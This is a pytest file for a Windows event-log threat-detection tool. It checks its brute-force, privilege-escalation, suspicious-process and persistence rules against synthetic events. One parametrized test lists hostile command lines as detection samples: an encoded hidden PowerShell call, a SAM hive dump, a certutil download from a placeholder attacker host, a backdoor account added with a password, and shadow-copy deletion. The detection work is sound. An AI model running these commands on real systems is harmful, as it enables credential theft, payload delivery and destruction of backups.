"""Unit tests for each detection rule, run against the generated sample
data plus a couple of hand-built edge cases."""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from winlog_threat_hunter.engine import run_rules
from winlog_threat_hunter.models import Event
from winlog_threat_hunter.parser import load_events
from winlog_threat_hunter.rules.brute_force import BruteForceRule
from winlog_threat_hunter.rules.persistence import AdminPersistenceRule
from winlog_threat_hunter.rules.privilege_escalation import PrivilegeEscalationRule
from winlog_threat_hunter.rules.suspicious_process import SuspiciousProcessRule

SAMPLE_DIR = Path(__file__).resolve().parent.parent / "sample_logs"
BASE = datetime(2026, 1, 1, tzinfo=timezone.utc)


def _e(**kwargs) -> Event:
    defaults = dict(event_id=0, timestamp=BASE, host="TESTHOST")
    defaults.update(kwargs)
    return Event(**defaults)


class TestBruteForceRule:
    def test_no_findings_below_threshold(self):
        events = [
            _e(event_id=4625, timestamp=BASE + timedelta(minutes=i), account_name="alice", source_ip="1.2.3.4")
            for i in range(4)  # threshold is 5
        ]
        assert BruteForceRule().evaluate(events) == []

    def test_finding_at_threshold(self):
        events = [
            _e(event_id=4625, timestamp=BASE + timedelta(minutes=i), account_name="alice", source_ip="1.2.3.4")
            for i in range(5)
        ]
        findings = BruteForceRule().evaluate(events)
        assert len(findings) == 2  # one for source_ip grouping, one for account grouping
        assert all(f.severity == "high" for f in findings)

    def test_escalated_to_critical_when_followed_by_success(self):
        events = [
            _e(event_id=4625, timestamp=BASE + timedelta(minutes=i), account_name="alice", source_ip="1.2.3.4")
            for i in range(5)
        ]
        events.append(_e(event_id=4624, timestamp=BASE + timedelta(minutes=6), account_name="alice", source_ip="1.2.3.4"))
        findings = BruteForceRule().evaluate(events)
        assert all(f.severity == "critical" for f in findings)

    def test_burst_reported_once_not_once_per_threshold_crossing(self):
        events = [
            _e(event_id=4625, timestamp=BASE + timedelta(minutes=i), account_name="alice", source_ip="1.2.3.4")
            for i in range(7)
        ]
        findings = BruteForceRule().evaluate(events)
        assert len(findings) == 2

    def test_gap_larger_than_window_splits_into_separate_clusters(self):
        events = [
            _e(event_id=4625, timestamp=BASE + timedelta(minutes=i), account_name="alice", source_ip="1.2.3.4")
            for i in range(5)
        ]
        later = BASE + timedelta(hours=5)
        events += [
            _e(event_id=4625, timestamp=later + timedelta(minutes=i), account_name="alice", source_ip="1.2.3.4")
            for i in range(5)
        ]
        findings = BruteForceRule().evaluate(events)
        assert len(findings) == 4


class TestPrivilegeEscalationRule:
    def test_flags_notable_logon_type_with_privilege_grant(self):
        events = [
            _e(event_id=4624, timestamp=BASE, account_name="bob", logon_type=10, source_ip="9.9.9.9"),
            _e(event_id=4672, timestamp=BASE + timedelta(minutes=1), account_name="bob"),
        ]
        findings = PrivilegeEscalationRule().evaluate(events)
        assert len(findings) == 1
        assert findings[0].severity == "medium"

    def test_ignores_benign_logon_types(self):
        events = [
            _e(event_id=4624, timestamp=BASE, account_name="svc", logon_type=3, source_ip="9.9.9.9"),
            _e(event_id=4672, timestamp=BASE + timedelta(minutes=1), account_name="svc"),
        ]
        assert PrivilegeEscalationRule().evaluate(events) == []

    def test_escalates_to_high_with_prior_failures(self):
        events = [
            _e(event_id=4625, timestamp=BASE, account_name="bob", logon_type=10),
            _e(event_id=4624, timestamp=BASE + timedelta(minutes=1), account_name="bob", logon_type=10, source_ip="9.9.9.9"),
            _e(event_id=4672, timestamp=BASE + timedelta(minutes=2), account_name="bob"),
        ]
        findings = PrivilegeEscalationRule().evaluate(events)
        assert findings[0].severity == "high"


class TestSuspiciousProcessRule:
    @pytest.mark.parametrize("cmdline", [
        "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ=",
        "reg.exe save hklm\\sam C:\\temp\\sam.hive",
        "certutil.exe -urlcache -split -f http://evil.example/payload.exe",
        "net.exe user backdoor P@ssw0rd123! /add",
        "vssadmin.exe delete shadows /all /quiet",
    ])
    def test_flags_known_bad_patterns(self, cmdline):
        events = [_e(event_id=4688, timestamp=BASE, process_name="cmd.exe", command_line=cmdline)]
        findings = SuspiciousProcessRule().evaluate(events)
        assert len(findings) == 1

    def test_ignores_benign_command_lines(self):
        events = [_e(event_id=4688, timestamp=BASE, process_name="outlook.exe", command_line="outlook.exe")]
        assert SuspiciousProcessRule().evaluate(events) == []


class TestAdminPersistenceRule:
    def test_flags_rapid_privileged_group_add(self):
        events = [
            _e(event_id=4720, timestamp=BASE, target_account="temp_admin"),
            _e(event_id=4732, timestamp=BASE + timedelta(minutes=2), target_account="temp_admin", target_group="Domain Admins"),
        ]
        findings = AdminPersistenceRule().evaluate(events)
        assert len(findings) == 1
        assert findings[0].severity == "critical"

    def test_non_privileged_group_is_lower_severity(self):
        events = [
            _e(event_id=4720, timestamp=BASE, target_account="kwong"),
            _e(event_id=4732, timestamp=BASE + timedelta(minutes=2), target_account="kwong", target_group="HelpDesk-L1"),
        ]
        findings = AdminPersistenceRule().evaluate(events)
        assert findings[0].severity == "medium"

    def test_ignores_slow_legitimate_onboarding(self):
        events = [
            _e(event_id=4720, timestamp=BASE, target_account="kwong"),
            _e(event_id=4732, timestamp=BASE + timedelta(hours=2), target_account="kwong", target_group="HelpDesk-L1"),
        ]
        assert AdminPersistenceRule().evaluate(events) == []


class TestSampleDatasets:
    def test_normal_activity_has_zero_findings(self):
        events = load_events(SAMPLE_DIR / "normal_activity.jsonl")
        assert run_rules(events) == []

    def test_brute_force_sample_flags_critical_and_high(self):
        events = load_events(SAMPLE_DIR / "brute_force_attack.jsonl")
        findings = run_rules(events)
        severities = {f.severity for f in findings}
        assert "critical" in severities
        assert any(f.rule_id == "BRUTE-001" for f in findings)
        assert any(f.rule_id == "PRIVESC-001" for f in findings)

    def test_persistence_sample_flags_critical_and_high(self):
        events = load_events(SAMPLE_DIR / "persistence_attack.jsonl")
        findings = run_rules(events)
        rule_ids = {f.severity for f in findings}
        assert "critical" in rule_ids
        assert any(f.rule_id == "PERSIST-001" for f in findings)
        assert any(f.rule_id == "PROC-001" for f in findings)
